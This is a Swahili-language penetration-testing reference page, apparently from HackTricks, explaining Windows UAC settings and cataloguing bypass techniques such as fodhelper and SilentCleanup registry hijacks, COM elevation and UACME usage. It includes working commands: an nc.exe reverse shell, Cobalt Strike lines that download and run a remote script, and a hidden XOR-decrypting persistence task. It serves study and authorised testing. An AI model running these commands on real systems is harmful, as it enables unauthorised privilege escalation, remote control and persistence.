# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kuomba idhini kwa shughuli zinazohitaji ruhusa za juu**. Programu zina viwango tofauti vya `integrity`, na programu yenye **kiwango cha juu** inaweza kutekeleza majukumu ambayo **yanaweza kuhatarisha mfumo**. UAC inapowashwa, programu na majukumu huendeshwa kila wakati **katika muktadha wa usalama wa akaunti isiyo ya msimamizi**, isipokuwa msimamizi aziruhusu waziwazi programu/majukumu hayo kupata ruhusa za kiwango cha msimamizi ili kuendeshwa kwenye mfumo. Ni kipengele cha urahisi kinachowalinda wasimamizi dhidi ya mabadiliko yasiyokusudiwa, lakini hakichukuliwi kuwa mpaka wa usalama.<sup>[[2]](#references)</sup>

Kwa maelezo zaidi kuhusu viwango vya integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC inapowekwa, mtumiaji msimamizi hupewa tokeni 2: tokeni ya mtumiaji wa kawaida, ya kutekeleza shughuli za kawaida katika kiwango cha medium integrity, na tokeni yenye ruhusa za msimamizi.

[Ukurasa huu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) unaeleza kwa kina jinsi UAC inavyofanya kazi na unajumuisha mchakato wa kuingia, matumizi kwa mtumiaji na usanifu wa UAC.<sup>[[2]](#references)</sup> Wasimamizi wanaweza kutumia sera za usalama kusanidi jinsi UAC inavyofanya kazi kulingana na mahitaji ya shirika lao kwenye mashine ya ndani (kwa kutumia secpol.msc), au kuisanidi na kuisambaza kupitia Group Policy Objects (GPO) katika mazingira ya kikoa cha Active Directory. Mipangilio mbalimbali imeelezwa kwa kina [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna mipangilio 10 ya Group Policy inayoweza kuwekwa kwa UAC. Jedwali lifuatalo lina maelezo zaidi:

| Mpangilio wa Group Policy                                                                                                                                                                                                                                                                                                                                                           | Ufunguo wa Registry                | Mpangilio Chaguomsingi                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Imezimwa)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Omba idhini kwa faili zisizo za Windows kwenye secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Omba vitambulisho vya kuingia kwenye secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Imewashwa; imezimwa kwa chaguomsingi kwenye Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Imezimwa)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Imewashwa)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Imewashwa)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Imezimwa)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Imewashwa)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Imewashwa)                                              |

### Sera za kusakinisha programu kwenye Windows

**Sera za usalama za ndani** ("secpol.msc" kwenye mifumo mingi) husanidiwa kwa chaguomsingi ili **kuzuia watumiaji wasio wasimamizi kusakinisha programu**. Hii inamaanisha kuwa hata kama mtumiaji asiye msimamizi anaweza kupakua kisakinishi cha programu yako, hataweza kukiendesha bila akaunti ya msimamizi.

### Funguo za Registry za Kulazimisha UAC Kuomba Ruhusa za Juu

Kama mtumiaji wa kawaida asiye na ruhusa za msimamizi, unaweza kuhakikisha kuwa akaunti ya "kawaida" **inaombwa vitambulisho vya kuingia na UAC** inapojaribu kutekeleza shughuli fulani. Ili kufanya hivyo, inahitajika kurekebisha **funguo fulani za registry**, jambo linalohitaji ruhusa za msimamizi, isipokuwa kuwe na **UAC bypass**, au mshambuliaji awe tayari ameingia kama msimamizi.

Hata kama mtumiaji yuko kwenye kundi la **Administrators**, mabadiliko haya humlazimisha mtumiaji **kuingiza tena vitambulisho vya akaunti yake** ili kutekeleza shughuli za kiutawala.

**Kwa vitendo, hii ni muhimu tu ikiwa tayari una tokeni iliyopewa ruhusa za juu, UAC bypass, au usanidi usio sahihi unaokuruhusu kubadilisha funguo hizi; la sivyo, uandishi kwenye registry yenyewe utazuiwa.**

Funguo na maingizo ya registry unayopaswa kubadilisha ni haya (pamoja na thamani zake za chaguomsingi kwenye mabano):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Hili linaweza pia kufanywa mwenyewe kupitia zana ya Local Security Policy. Baada ya mabadiliko, shughuli za kiutawala humwomba mtumiaji aingize tena vitambulisho vyake.

### Dokezo

**User Account Control si mpaka wa usalama.** Kwa hiyo, watumiaji wa kawaida hawawezi kujinasua kutoka kwenye akaunti zao na kupata ruhusa za msimamizi bila kutumia exploit ya local privilege escalation.

### Mwombe mtumiaji 'ufikiaji kamili wa kompyuta'

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### Haki za UAC

- Internet Explorer Protected Mode hutumia ukaguzi wa integrity kuzuia michakato yenye kiwango cha juu cha integrity (kama vivinjari vya wavuti) kufikia data yenye kiwango cha chini cha integrity (kama folda ya temporary Internet files). Hili hufanywa kwa kuendesha kivinjari kwa token yenye kiwango cha chini cha integrity. Kivinjari kinapojaribu kufikia data iliyohifadhiwa katika eneo lenye kiwango cha chini cha integrity, mfumo wa uendeshaji hukagua kiwango cha integrity cha mchakato na kuruhusu ufikiaji ipasavyo. Kipengele hiki husaidia kuzuia mashambulizi ya remote code execution kupata ufikiaji wa data nyeti kwenye mfumo.
- Mtumiaji anapoingia kwenye Windows, mfumo huunda access token iliyo na orodha ya haki za mtumiaji. Haki hufafanuliwa kama mchanganyiko wa ruhusa na uwezo wa mtumiaji. Token pia ina orodha ya credentials za mtumiaji, ambazo hutumiwa kumthibitisha mtumiaji kwenye kompyuta na kwenye rasilimali za mtandao.

### Autoadminlogon

Ili kusanidi Windows iingie kiotomatiki kwa mtumiaji mahususi wakati wa kuwasha, weka **`AutoAdminLogon` registry key**. Hili ni muhimu katika mazingira ya kiosk au kwa madhumuni ya majaribio. Tumia hili kwenye mifumo salama pekee, kwa kuwa nenosiri huwekwa wazi kwenye registry.

Weka keys zifuatazo ukitumia Registry Editor au `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Ili kurejesha tabia ya kawaida ya kuingia, weka `AutoAdminLogon` kuwa 0.

## UAC bypass

> [!TIP]
> Kumbuka kwamba ikiwa una ufikiaji wa kielelezo kwenye mashine ya mwathiriwa, UAC bypass ni rahisi moja kwa moja kwa sababu unaweza kubofya tu "Yes" kidokezo cha UAC kinapoonekana.

UAC bypass inahitajika katika hali ifuatayo: **UAC imewashwa, mchakato wako unaendeshwa katika muktadha wa medium integrity, na mtumiaji wako ni mshiriki wa kundi la administrators**.

Ni muhimu kutaja kwamba **ni vigumu zaidi kufanya UAC bypass ikiwa iko kwenye kiwango cha juu zaidi cha usalama (Always) kuliko ikiwa iko kwenye viwango vingine vyovyote (Default).**

### Uchunguzi wa haraka kutoka kwenye medium-integrity shell

Kabla ya kujaribu bypass, thibitisha kuwa uko katika hali inayofaa na linganisha build ya host na mbinu zinazojulikana kufanya kazi:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Vidokezo vya vitendo:
- Ikiwa `EnableLUA=0`, huhitaji bypass: tokeni yoyote ya admin inaweza kuomba integrity ya juu moja kwa moja.
- `ConsentPromptBehaviorAdmin=2` au `5` ndiyo hali ya kawaida kwa auto-elevate / bypasses zinazotegemea COM.
- `Always Notify` huongeza ugumu, lakini bado unapaswa kujaribu build husika badala ya kudhani kuwa haitafaulu: UACME bado hufuatilia baadhi ya mbinu zinazooana na `AlwaysNotify` kwenye builds za kisasa za Windows.<sup>[[3]](#references)</sup>

### UAC imezimwa

Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`**), unaweza **kuendesha reverse shell yenye mapendeleo ya admin** (kiwango cha juu cha integrity) kwa kutumia kitu kama:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass kwa kutumia token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + reusable debug object

Kiolesura cha AppInfo local RPC `201ef99a-7fa0-444c-9399-19ba84f12a1a` kinaweza kuunda process huku debugging ikiwa imewashwa. Process zinazoundwa kupitia debugging kwenye thread hiyo hiyo hushiriki debug object ya thread hiyo; tukio la uundaji hubeba handle ya process yenye ufikiaji kamili hata kama matokeo ya RPC yenyewe yanatoa ufikiaji mdogo pekee. Hii hugeuza matumizi tena ya debug object kuwa primitive ya UAC kwa mwanachama wa kundi la Administrators mwenye medium-integrity.<sup>[[11]](#references)[[12]](#references)</sup>

Mfuatano wa vitendo ni:<sup>[[11]](#references)[[12]](#references)</sup>

1. Piga method ya local RPC (moja kwa moja au kupitia `NdrAsyncClientCall`) ili kuunda process ya muda isiyo na elevated privileges, huku debugging ikiwa imewashwa.
2. Uliza `ProcessDebugObjectHandle` kwa kutumia `NtQueryInformationProcess`, tenganisha object hiyo kwa `NtRemoveProcessDebug`, ihifadhi, kisha sitisha process ya muda.
3. Tumia kiolesura hicho hicho cha RPC kuunda process inayoaminika ambayo hujiendesha kwa elevated privileges kiotomatiki, kisha unganisha object iliyohifadhiwa na thread inayoita kwa kutumia `DbgUiSetThreadDebugObject`.
4. Piga `WaitForDebugEvent` na uchukue process handle ya `CREATE_PROCESS_DEBUG_EVENT`; iinakili kwa `NtDuplicateObject` kabla ya kuendelea.
5. Pitisha handle iliyonakiliwa kwa `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` na uanzishe payload kwa kutumia muundo wa extended startup-info. Hii hutumia tena muktadha wa process yenye elevated privileges na pia kumpa child uhusiano wa parent unaoonekana kuaminika.

Tafuta mfuatano huu mfupi badala ya kutafuta binary inayojiendesha kwa elevated privileges kiotomatiki pekee: uundaji wa process kupitia local AppInfo RPC, maulizo ya `ProcessDebugObjectHandle`, kutenganisha/kuunganisha tena debugger, tukio la uundaji wa debugging linalofuata mara moja, kunakili handle, na child ambaye parent aliyerekodiwa haulingani na process iliyotumia API za uundaji.<sup>[[12]](#references)</sup>

### **UAC "bypass" ya Msingi Sana** (ufikiaji kamili wa file system)

Ikiwa una shell yenye mtumiaji aliye ndani ya kundi la Administrators, unaweza **mount shared ya C$** kupitia SMB (file system) ya ndani kwenye disk mpya, na utakuwa na **ufikiaji wa kila kitu ndani ya file system** (hata folda ya nyumbani ya Administrator).

> [!WARNING]
> **Inaonekana mbinu hii haifanyi kazi tena**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### UAC bypass with cobalt strike

Mbinu za Cobalt Strike zitafanya kazi tu ikiwa UAC haijawekwa kwenye kiwango chake cha juu zaidi cha usalama.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** na **Metasploit** pia zina modules kadhaa za **bypass** **UAC**.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

COM objects zinazoinuliwa kiotomatiki bado ni njia ya vitendo ya kushambulia UAC kwenye matoleo ya sasa. `ICMLuaUtil` bado imeorodheshwa na UACME kama inayofanya kazi kwenye matoleo ya sasa ya Windows, na offensive tooling inaendelea kurekebisha `CMSTPLUA` kwa kuichanganya na mchakato wa interactive desktop, utekelezaji wa biti 64, na wakati mwingine kujifanya kuwa PEB/mchakato mwingine kabla ya kuita COM Elevation Moniker.<sup>[[3]](#references)</sup>

Vidokezo vya vitendo:
- Pendelea mchakato wa **biti 64** katika **interactive session** ya mtumiaji (kwa kawaida `explorer.exe` au child process yake).
- Ikiwa raw shell itashindwa, jaribu tena kutoka kwa utekelezaji wa BOF / UACME badala ya wrapper rahisi ya `CreateProcess`.
- Tarajia child process kuendeshwa katika **mchakato tofauti wenye elevated privileges**; BOF nyingi haziinui beacon ya sasa moja kwa moja.

### KRBUACBypass

Nyaraka na tool zinapatikana kwenye [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) ni mkusanyiko wa mbinu za UAC bypass. Icompile kwa Visual Studio au MSBuild; build huunda executables kadhaa (kwa mfano, `Source\Akagi\output\x64\Debug\Akagi.exe`), kwa hivyo chagua method inayofaa kwa build ya target.<sup>[[3]](#references)</sup>\
Kuwa mwangalifu: baadhi ya bypasses huzindua programu au prompts zinazoonekana, ambazo zinaweza kumtahadharisha mtumiaji.<sup>[[3]](#references)</sup>

UACME ina **build version ambayo kila technique ilianza kufanya kazi**.<sup>[[3]](#references)</sup> Unaweza kutafuta technique inayoathiri matoleo yako:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Pia, ukitumia ukurasa [huu](https://en.wikipedia.org/wiki/Windows_10_version_history), unaweza kupata toleo la Windows `1607` kutoka kwa nambari za build.

Mtiririko wa kazi wa vitendo ni **kutathmini build ya host** kwanza, kisha kutumia njia inayolingana:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` hulinganisha haraka build ya ndani na mbinu zake zinazojulikana za UAC, jambo linalosaidia kuondoa PoCs zisizofanya kazi mapema.<sup>[[4]](#references)</sup>
- `UACME` bado ndiyo katalogi bora ya umma ya kulinganisha bypass na build mahususi. Toleo la 3.7.1 liliongeza mbinu 83–85, huku toleo lililotangulia likijaribu tena mbinu zilizopo dhidi ya **Windows 11 25H2**; kagua tena jedwali la mbinu na maelezo ya matoleo badala ya kudhani kuwa PoC ya zamani bado inatumika bila mabadiliko.<sup>[[3]](#references)[[9]](#references)</sup>

### Minyororo ya WNF/UIAccess inayooana na Always Notify (UACME 3.7.1)

`Always Notify` haiondoi kila UAC bypass. UACME 3.7.1 inatekeleza mbinu tatu mpya za x64 zinazochanganya hali ya mazingira/protokali inayodhibitiwa na mtumiaji na tabia ya scheduled-task au UIAccess yenye ruhusa za juu, na kuziainisha zote kuwa `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** elekeza upya `SystemRoot` ili WNF ichochee `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`, na kufanya `taskhostw.exe` yenye ruhusa za juu ipakie `unifiedconsent.dll` kwa side-load. UACME inafuatilia mbinu hii kuanzia Windows 10 build 19041.
- **84 — TabTip:** tumia primitive ileile ya kigezo cha mazingira dhidi ya UIAccess `TabTip.exe`, ambayo hupakia `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll`, au `rsaenh.dll` kutegemea build, kisha endelea kutoka kwenye muktadha wa UIAccess wa integrity ya juu unaotokana na hilo. UACME inafuatilia mbinu hii kuanzia Windows 8.1 / Server 2016.
- **85 — Narrator:** teka nyara protokali ya `feedback-hub` ya mtumiaji, endesha Narrator kwa `Alt+CapsLock+F`, kisha uzindue nakala ya `osk.exe` inayoweza kuandikwa, ambayo hupakia `OskSupport.dll` kwa side-load. Hii inahitaji desktop shirikishi na inafuatiliwa kuanzia Windows 10 1809 / Server 2019.

Baada ya kuunda vipengee vya payload na Akagi kama ilivyoelezwa kwenye UACME, endesha nambari ya mbinu inayolingana (amri ya hiari hutumia `cmd.exe` kwa chaguomsingi):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Mbinu 84 na 85 hutegemea UIAccess/maingiliano ya desktop, kwa hivyo usitarajie zifanye kazi bila mabadiliko kutoka Session 0 au shell ya huduma isiyo na maingiliano. Zote tatu hubadilisha hali ya mazingira/protokali na huweka DLL; kagua utekelezaji na uondoe mabaki hayo baada ya majaribio.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Binary inayoaminika `fodhelper.exe` hujiendesha kwa kiwango cha juu kiotomatiki kwenye matoleo ya kisasa ya Windows. Inapozinduliwa, hukagua njia ya registry ya kila mtumiaji iliyo hapa chini bila kuthibitisha kitenzi cha `DelegateExecute`. Kuweka amri hapo huruhusu mchakato wa Medium Integrity (mtumiaji yuko kwenye Administrators) kuzindua mchakato wa High Integrity bila kidokezo cha UAC.

Njia ya registry inayokaguliwa na fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>Hatua za PowerShell (weka payload yako, kisha iwashe)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Maelezo:
- Hufanya kazi wakati mtumiaji wa sasa ni mwanachama wa Administrators na kiwango cha UAC ni default/legevu (si Always Notify pamoja na vizuizi vya ziada).
- Tumia njia ya `sysnative` kuanzisha PowerShell ya biti 64 kutoka kwenye mchakato wa biti 32 kwenye Windows ya biti 64.
- Payload inaweza kuwa amri yoyote (PowerShell, cmd, au njia ya EXE). Epuka UI zinazoomba mwingiliano wa mtumiaji ili kudumisha usiri.

#### `ComputerDefaults.exe` trigger ya handler ileile ya `ms-settings`

`ComputerDefaults.exe` hutumia uhusiano uleule wa kila mtumiaji wa `ms-settings\Shell\Open\command` kama `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Baada ya kuweka amri chaguomsingi na thamani tupu ya `DelegateExecute` iliyo hapo juu, tumia `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` kama trigger mbadala; usirudie usanidi wa registry.<sup>[[13]](#references)[[14]](#references)</sup> Masharti ya msimamizi mwenye medium-integrity na sera ya UAC yaliyo kwenye maelezo ya `fodhelper.exe` hapo juu bado yanatumika.<sup>[[2]](#references)[[3]](#references)</sup> UACME inaorodhesha trigger hii kuanzia Windows 10 RS4 (build 17134), kwa hiyo ithibitishe kwenye build lengwa.<sup>[[3]](#references)</sup>

#### Lahaja ya CurVer/extension hijack (HKCU pekee)

Sampuli za hivi karibuni zinazotumia vibaya `fodhelper.exe` huepuka `DelegateExecute` na badala yake **huelekeza upya ProgID ya `ms-settings`** kupitia thamani ya kila mtumiaji ya `CurVer`. Binary inayoinuliwa kiotomatiki bado hutafuta handler chini ya `HKCU`, kwa hiyo hakuna tokeni ya msimamizi inayohitajika ili kuweka keys:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Mara tu inapopata privileges za juu, malware kwa kawaida **huzima prompts za baadaye** kwa kuweka `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` kuwa `0`, kisha hufanya defense evasion zaidi (kwa mfano, `Add-MpPreference -ExclusionPath C:\ProgramData`) na kuunda upya persistence ili iendeshe kwa high integrity. Task ya kawaida ya persistence huhifadhi **PowerShell script iliyosimbwa kwa XOR** kwenye diski, kisha huitoa msimbo na kuiendesha kwenye memory kila saa:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Lahaja hii bado husafisha dropper na kuacha payloads zilizowekwa hatua kwa hatua pekee, hivyo ugunduzi hutegemea kufuatilia **u-hijack wa `CurVer`**, kuchezea `ConsentPromptBehaviorAdmin`, kuunda kizuizi cha Defender, au kazi zilizopangwa ambazo hufanya decrypt ya PowerShell in-memory.<sup>[[5]](#references)</sup>

### UAC bypass kupitia kazi ya `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` huzindua `cleanmgr.exe` kwa ruhusa za juu zaidi na kupanua `%windir%` kutoka kwenye mazingira ya mtumiaji. Ukidhibiti `HKCU\Environment\windir`, unaweza kuelekeza upanuzi huo kwenye amri yoyote na kupata uadilifu wa juu bila kidirisha cha idhini.<sup>[[8]](#references)</sup> Mbinu hii bado inafaa kujaribiwa kwenye matoleo ya hivi karibuni kwa sababu UACME inaendelea kuitumia, na ufuatiliaji wa hivi karibuni wa masuala unaonyesha kuwa Windows 11 24H2 huenda ikahitaji marekebisho madogo tu ya jinsi ya kuweka alama za kunukuu.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Ikiwa kazi inahitaji nukuu kwenye njia hiyo ya build, jaribu tena kwa payload inayoishia na nukuu (kwa mfano `cmd.exe"`). Safisha `HKCU\Environment\windir` kila wakati baada ya majaribio.

#### UAC bypass zaidi

UAC bypass nyingi za kawaida zinazotumia UI flows, COM objects, au mwingiliano wa desktop zinahitaji **full interactive session** na mtumiaji lengwa; shell ya kawaida ya `nc.exe` au huduma inayoendeshwa katika **Session 0** mara nyingi haitoshi.

Mara nyingi unaweza kutatua hilo kwa kutumia session ya **meterpreter**. Hamia kwenye **process** yenye thamani ya **Session** iliyo sawa na **1**:

![Elekeza ms-settings kwenye custom extension (.thm) na uunganishe extension hiyo na payload yetu - UAC bypass zaidi: Unaweza kutumia session ya meterpreter. Hamia kwenye process yenye Session...](<../../images/image (863).png>)

(_explorer.exe_ inapaswa kufanya kazi)

### UAC Bypass kupitia GUI

Ikiwa una ufikiaji wa **GUI, unaweza kukubali tu kidokezo cha UAC** kinapoonekana; huhitaji kabisa bypass ya kiufundi. Kwa hiyo, kupata GUI session mara nyingi kunatosha kuondoa kikwazo cha vitendo kinachoongezwa na UAC.

Zaidi ya hayo, ukipata GUI session ambayo mtu alikuwa akiitumia (huenda kupitia RDP), kuna **baadhi ya tools zitakazokuwa zinaendeshwa kama administrator** ambazo unaweza kutumia **kuendesha** **cmd**, kwa mfano, **kama admin** moja kwa moja bila kuombwa tena na UAC, kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa **stealthy** zaidi kidogo.

### UAC bypass ya brute-force yenye kelele nyingi

Ikiwa kelele haileti shida, tool kama [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) inaweza kuomba ruhusa za juu mara kwa mara hadi mtumiaji akubali.

### Bypass yako mwenyewe - Mbinu ya msingi ya UAC bypass

Ukiangalia **UACME**, utaona kwamba **UAC bypass nyingi hutumia DLL hijacking** (mara nyingi kwa kufanya binary iliyoinuliwa ipakie DLL inayodhibitiwa na mshambuliaji kutoka kwenye njia inayoweza kuandikwa). [Soma hapa ili ujifunze jinsi ya kupata udhaifu wa DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Tafuta binary inayofanya **autoelevate** (hakikisha kwamba inapotekelezwa, inaendeshwa katika kiwango cha juu cha integrity).
2. Tumia procmon kutafuta matukio ya "**NAME NOT FOUND**" yanayoweza kuwa hatarishi kwa **DLL Hijacking**.
3. Huenda utahitaji **kuandika** DLL ndani ya baadhi ya **njia zilizolindwa** (kama C:\Windows\System32) ambako huna ruhusa za kuandika. Unaweza kukwepa hili kwa kutumia:
